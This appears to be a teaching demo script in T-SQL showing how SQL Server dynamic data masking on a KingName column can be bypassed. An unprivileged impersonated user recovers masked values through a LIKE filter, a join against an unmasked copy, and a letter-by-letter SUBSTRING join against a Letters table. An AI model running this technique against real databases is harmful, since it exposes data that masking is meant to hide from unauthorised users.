--Demo Data Masking
IF EXISTS (SELECT * FROM SYS.OBJECTS WHERE NAME='Kings')
	DROP TABLE Kings
GO
CREATE TABLE dbo.Kings
(
	KingName sysname not null,
	Reign varchar(100) not null
	Constraint Pk_Kings PRIMARY KEY CLUSTERED (KingName)
)
GO

Insert into dbo.Kings (KingName, Reign)
Select distinct Kingname, Reign from dbo.Kingdoms

Select * from dbo.Kings

--Masking column

  ALTER TABLE dbo.Kingdoms
    ALTER COLUMN KingName ADD MASKED WITH (FUNCTION = 'Partial(2, "***", 0)');
    GO

	GRANT SELECT ON dbo.Kingdoms to public
	GRANT SELECT ON dbo.Kings to public

	GRANT UNMASK TO Pelayo

-- Using DBO

Select * from dbo.kingdoms

EXECUTE AS USER='Pelayo'
	Select * from dbo.kingdoms
REVERT

EXECUTE AS USER='Tolosano'
	Select * from dbo.kingdoms
REVERT

--Exploit

EXECUTE AS USER='Tolosano'
	Select * from dbo.kingdoms 
	where Kingname like '%Teodo%'
REVERT

EXECUTE AS USER='Tolosano'
	Select * from dbo.kingdoms a
	join dbo.Kings b on a.kingname=b.kingname
REVERT

-- Geting all information

CREATE TABLE dbo.Letters
    (
        Letter NVARCHAR(1)  NOT NULL,
        CONSTRAINT PK_Letters PRIMARY KEY CLUSTERED  ( Letter ASC ) 
    );

    INSERT INTO dbo.Letters (Letter)
    VALUES ('A'), ('B'), ('C'), ('D'), ('E'), ('F'), ('G'), ('H'), ('I'), 
           ('J'), ('K'), ('L'), ('M'), ('N'), ('O'), ('P'), ('Q'), ('R'),
           ('S'), ('T'), ('U'), ('V'), ('W'), ('X'), ('Y'), ('Z'), (' ');
    
    GRANT SELECT ON dbo.Letters TO Public; -- Very safe!

    
    SELECT * FROM dbo.Letters;

	EXECUTE AS USER = 'Tolosano';
    SELECT b.*, 
           k01.Letter AS L01,
           k02.Letter AS L02,
           k03.Letter AS L03,
           k04.Letter AS L04,
           k05.Letter AS L05,
           k06.Letter AS L06,
           k07.Letter AS L07,
           k08.Letter AS L08,
           k09.Letter AS L09,
           k10.Letter AS L10,
           k11.Letter AS L11,
           k12.Letter AS L12,
           k13.Letter AS L13,
           k14.Letter AS L14     
    FROM dbo.Kingdoms b
         INNER JOIN dbo.Letters AS k01 ON (k01.Letter = SUBSTRING(b.Kingname,01,1))
         INNER JOIN dbo.Letters AS k02 ON (k02.Letter = SUBSTRING(b.Kingname,02,1))
         INNER JOIN dbo.Letters AS k03 ON (k03.Letter = SUBSTRING(b.Kingname,03,1))
         INNER JOIN dbo.Letters AS k04 ON (k04.Letter = SUBSTRING(b.Kingname,04,1))
         INNER JOIN dbo.Letters AS k05 ON (k05.Letter = SUBSTRING(b.Kingname,05,1))
         INNER JOIN dbo.Letters AS k06 ON (k06.Letter = SUBSTRING(b.Kingname,06,1))
         INNER JOIN dbo.Letters AS k07 ON (k07.Letter = SUBSTRING(b.Kingname,07,1))
         INNER JOIN dbo.Letters AS k08 ON (k08.Letter = SUBSTRING(b.Kingname,08,1))
         INNER JOIN dbo.Letters AS k09 ON (k09.Letter = SUBSTRING(b.Kingname,09,1))
         INNER JOIN dbo.Letters AS k10 ON (k10.Letter = SUBSTRING(b.Kingname,10,1))
         INNER JOIN dbo.Letters AS k11 ON (k11.Letter = SUBSTRING(b.Kingname,11,1))
         INNER JOIN dbo.Letters AS k12 ON (k12.Letter = SUBSTRING(b.Kingname,12,1))
         INNER JOIN dbo.Letters AS k13 ON (k13.Letter = SUBSTRING(b.Kingname,13,1))
         INNER JOIN dbo.Letters AS k14 ON (k14.Letter = SUBSTRING(b.Kingname,14,1))
    REVERT;

--This not work
    EXECUTE AS USER = 'Tolosano';
    SELECT b.*, 
           (SELECT Letter FROM dbo.Letters AS k01 WHERE k01.Letter = SUBSTRING(b.Kingname,1,1)) AS L01,
           (SELECT Letter FROM dbo.Letters AS k02 WHERE k02.Letter = SUBSTRING(b.Kingname,2,1)) AS L02,
           (SELECT Letter FROM dbo.Letters AS k03 WHERE k03.Letter = SUBSTRING(b.Kingname,3,1)) AS L03
    FROM dbo.Kingdom b
    REVERT;